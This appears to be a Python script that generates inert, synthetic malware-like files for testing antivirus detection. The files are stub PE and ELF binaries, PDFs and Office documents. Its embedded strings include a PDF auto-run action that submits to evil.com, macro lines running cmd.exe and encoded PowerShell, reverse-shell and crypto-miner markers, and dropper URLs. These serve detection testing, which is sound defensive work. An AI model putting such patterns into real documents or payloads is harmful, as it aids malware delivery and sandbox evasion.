#!/usr/bin/env python3
"""
Generate synthetic malware-like test samples for antivirus detection validation.
These are NOT real malware — they contain patterns that should trigger detection.
All generated in an isolated container for safety.
"""
import struct, hashlib, os, json, zlib

OUTDIR = "/samples/generated"
os.makedirs(OUTDIR, exist_ok=True)

results = []

def save(name, data, desc):
    path = os.path.join(OUTDIR, name)
    with open(path, "wb") as f:
        f.write(data)
    sha = hashlib.sha256(data).hexdigest()
    results.append({"file": name, "sha256": sha, "size": len(data), "desc": desc})
    print(f"  [{len(data):>8} bytes] {name}: {desc}")

print("=== Generating synthetic test samples ===\n")

# ─── 1. EICAR variants ──────────────────────────────────────────
eicar = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
save("eicar_standard.txt", eicar, "Standard EICAR test string")
save("eicar_with_padding.txt", b"\x00"*1024 + eicar + b"\x00"*1024, "EICAR embedded in padding")
save("eicar_double.txt", eicar + b"\n" + eicar, "Double EICAR string")

# ─── 2. PE with suspicious characteristics ──────────────────────
def make_pe(name, desc, is_dll=False, zero_ts=False, writable_text=False, high_entropy_section=False):
    pe = bytearray(8192)
    pe[0:2] = b'MZ'
    pe[0x3C:0x40] = struct.pack('<I', 0x80)  # e_lfanew
    pe[0x80:0x84] = b'PE\x00\x00'
    pe[0x84:0x86] = struct.pack('<H', 0x8664)  # Machine: AMD64
    pe[0x86:0x88] = struct.pack('<H', 2)  # NumberOfSections
    ts = 0 if zero_ts else 0x60000000
    pe[0x88:0x8C] = struct.pack('<I', ts)
    pe[0x94:0x96] = struct.pack('<H', 0xF0)  # SizeOfOptionalHeader
    characteristics = 0x22  # EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
    if is_dll:
        characteristics |= 0x2000  # DLL
    pe[0x96:0x98] = struct.pack('<H', characteristics)
    # Optional header
    pe[0x98:0x9A] = struct.pack('<H', 0x20B)  # PE32+
    pe[0x98+16:0x98+20] = struct.pack('<I', 0x1000)  # AddressOfEntryPoint
    # Section headers at 0x188
    sect_off = 0x188
    # .text section
    pe[sect_off:sect_off+8] = b'.text\x00\x00\x00'
    pe[sect_off+8:sect_off+12] = struct.pack('<I', 0x1000)  # VirtualSize
    pe[sect_off+12:sect_off+16] = struct.pack('<I', 0x1000)  # VirtualAddress
    pe[sect_off+16:sect_off+20] = struct.pack('<I', 0x1000)  # SizeOfRawData
    pe[sect_off+20:sect_off+24] = struct.pack('<I', 0x200)  # PointerToRawData
    text_chars = 0x60000020  # CODE|EXECUTE|READ
    if writable_text:
        text_chars |= 0x80000000  # WRITE (suspicious: W+X)
    pe[sect_off+36:sect_off+40] = struct.pack('<I', text_chars)
    # .data section
    sect2 = sect_off + 40
    pe[sect2:sect2+8] = b'.data\x00\x00\x00'
    pe[sect2+8:sect2+12] = struct.pack('<I', 0x1000)
    pe[sect2+12:sect2+16] = struct.pack('<I', 0x2000)
    pe[sect2+16:sect2+20] = struct.pack('<I', 0x1000)
    pe[sect2+20:sect2+24] = struct.pack('<I', 0x1200)
    pe[sect2+36:sect2+40] = struct.pack('<I', 0xC0000040)  # READ|WRITE|INITIALIZED
    # Add suspicious strings to .text section
    text_data = bytearray(0x1000)
    suspicious_apis = [
        b"VirtualAllocEx\x00", b"WriteProcessMemory\x00", b"CreateRemoteThread\x00",
        b"IsDebuggerPresent\x00", b"NtQueryInformationProcess\x00",
        b"InternetOpenA\x00", b"URLDownloadToFileA\x00",
        b"RegSetValueExA\x00", b"CreateServiceA\x00",
    ]
    off = 0
    for api in suspicious_apis:
        text_data[off:off+len(api)] = api
        off += len(api)
    if high_entropy_section:
        import random
        random.seed(42)
        for i in range(0x200, 0x1000):
            text_data[i] = random.randint(0, 255)
    pe[0x200:0x1200] = text_data
    save(name, bytes(pe), desc)

make_pe("pe_clean.exe", "PE with normal characteristics")
make_pe("pe_zero_timestamp.exe", "PE with zero timestamp (suspicious)", zero_ts=True)
make_pe("pe_writable_code.exe", "PE with W+X .text section (packed/self-modifying)", writable_text=True)
make_pe("pe_injection_apis.exe", "PE with process injection APIs (VirtualAllocEx etc)")
make_pe("pe_packed_entropy.exe", "PE with high-entropy .text (packed)", high_entropy_section=True)
make_pe("pe_dll_suspicious.dll", "DLL with injection APIs", is_dll=True)

# ─── 3. ELF with suspicious patterns ────────────────────────────
def make_elf(name, desc, symbols=None):
    elf = bytearray(4096)
    elf[0:4] = b'\x7fELF'
    elf[4] = 2  # 64-bit
    elf[5] = 1  # little-endian
    elf[6] = 1  # version
    elf[7] = 0  # ELFOSABI_NONE
    elf[16:18] = struct.pack('<H', 2)  # ET_EXEC
    elf[18:20] = struct.pack('<H', 0x3E)  # EM_X86_64
    elf[24:32] = struct.pack('<Q', 0x400000)  # entry point
    if symbols:
        off = 512
        for sym in symbols:
            elf[off:off+len(sym)] = sym.encode() + b'\x00'
            off += len(sym) + 1
    save(name, bytes(elf), desc)

make_elf("elf_clean.bin", "Clean ELF binary")
make_elf("elf_ptrace.bin", "ELF with ptrace (anti-debug)", symbols=["ptrace", "PTRACE_TRACEME"])
make_elf("elf_preload.bin", "ELF with LD_PRELOAD hijack", symbols=["LD_PRELOAD", "dlopen", "dlsym"])
make_elf("elf_crypto_miner.bin", "ELF with mining patterns", symbols=["stratum+tcp", "xmrig", "pool.minexmr.com:4444"])
make_elf("elf_reverse_shell.bin", "ELF with reverse shell patterns", symbols=["socket", "connect", "dup2", "execve", "/bin/sh"])
make_elf("elf_rootkit.bin", "ELF with rootkit indicators", symbols=["hide_pid", "sys_call_table", "module_hide", "rootkit"])

# ─── 4. PDF exploits ────────────────────────────────────────────
def make_pdf(name, desc, js=None, launch=False, openaction_js=False):
    parts = [b"%PDF-1.4\n"]
    parts.append(b"1 0 obj<</Type/Catalog/Pages 2 0 R")
    if openaction_js and js:
        parts.append(b"/OpenAction 3 0 R")
    parts.append(b">>endobj\n")
    parts.append(b"2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\n")
    if js:
        parts.append(b"3 0 obj<</Type/Action/S/JavaScript/JS(" + js.encode() + b")>>endobj\n")
    if launch:
        parts.append(b"4 0 obj<</Type/Action/S/Launch/F(cmd.exe)>>endobj\n")
    parts.append(b"xref\n0 5\ntrailer<</Size 5/Root 1 0 R>>\nstartxref\n0\n%%EOF")
    save(name, b"".join(parts), desc)

make_pdf("pdf_clean.pdf", "Clean PDF")
make_pdf("pdf_javascript.pdf", "PDF with JavaScript", js="app.alert('xss')")
make_pdf("pdf_openaction_js.pdf", "PDF with auto-exec JavaScript", js="this.submitForm('http://evil.com/')", openaction_js=True)
make_pdf("pdf_launch.pdf", "PDF with Launch action (cmd.exe)", launch=True)
make_pdf("pdf_heap_spray.pdf", "PDF with heap spray pattern", js="%u0c0c"*5000)

# ─── 5. Office with macros ──────────────────────────────────────
def make_ole(name, desc, content=b""):
    data = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1' + b'\x00' * 504 + content
    save(name, data, desc)

make_ole("doc_clean.doc", "Clean OLE2 document")
make_ole("doc_autoopen.doc", "Document with AutoOpen macro",
         b"AutoOpen\x00" * 5 + b"Sub AutoOpen()\x00" + b"Shell(\"cmd.exe /c calc\")\x00")
make_ole("doc_powershell.doc", "Document with PowerShell dropper",
         b"AutoOpen\x00" + b"Shell(\"powershell -enc\")\x00" + b"WScript.Shell\x00" + b"CreateObject\x00")
make_ole("doc_dde.doc", "Document with DDE attack",
         b"DDE\x00" + b"DDEAUTO\x00" + b"cmd.exe\x00")
make_ole("doc_network.doc", "Document with network macro",
         b"AutoOpen\x00" + b"XMLHTTP\x00" + b"URLDownloadToFile\x00" + b"WinHttp\x00")

# ─── 6. Anti-sandbox evasion samples ────────────────────────────
def make_evasive(name, desc, strings):
    data = bytearray(4096)
    data[0:2] = b'MZ'
    data[0x3C:0x40] = struct.pack('<I', 0x80)
    data[0x80:0x84] = b'PE\x00\x00'
    data[0x84:0x86] = struct.pack('<H', 0x8664)
    off = 512
    for s in strings:
        enc = s.encode() + b'\x00'
        data[off:off+len(enc)] = enc
        off += len(enc)
    save(name, bytes(data), desc)

make_evasive("evasive_vm_detect.exe", "PE with VM detection strings",
    ["VMware", "VBoxService", "QEMU", "vmtoolsd", "sbiedll.dll"])
make_evasive("evasive_debug.exe", "PE with anti-debug techniques",
    ["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "NtQueryInformationProcess", "OutputDebugString"])
make_evasive("evasive_env_check.exe", "PE with environment fingerprinting",
    ["GetComputerName", "GetUserName", "NUMBER_OF_PROCESSORS", "GetDiskFreeSpace", "GlobalMemoryStatusEx", "PROCESSOR_IDENTIFIER"])
make_evasive("evasive_timing.exe", "PE with timing evasion",
    ["GetTickCount", "QueryPerformanceCounter", "Sleep(", "rdtsc"])

# ─── 7. URL-bearing samples ─────────────────────────────────────
url_data = b"GET /malware HTTP/1.1\r\nHost: evil.tk\r\n\r\n"
url_data += b"http://192.168.1.1:4444/shell.exe\x00"
url_data += b"https://bit.ly/malware123\x00"
url_data += b"http://malware.xyz/dropper\x00"
save("url_bearer.bin", url_data, "Binary with suspicious URLs (IP, shortener, suspicious TLD)")

# ─── Summary ────────────────────────────────────────────────────
print(f"\n=== Generated {len(results)} samples ===\n")
with open(os.path.join(OUTDIR, "manifest.json"), "w") as f:
    json.dump(results, f, indent=2)
print("Manifest written to manifest.json")
